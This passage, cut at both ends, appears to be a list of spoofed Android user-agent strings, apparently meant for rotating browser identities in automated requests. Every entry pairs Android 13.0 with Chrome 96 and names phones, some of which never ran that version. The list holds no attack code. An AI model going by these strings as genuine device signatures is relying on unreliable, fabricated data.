Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) 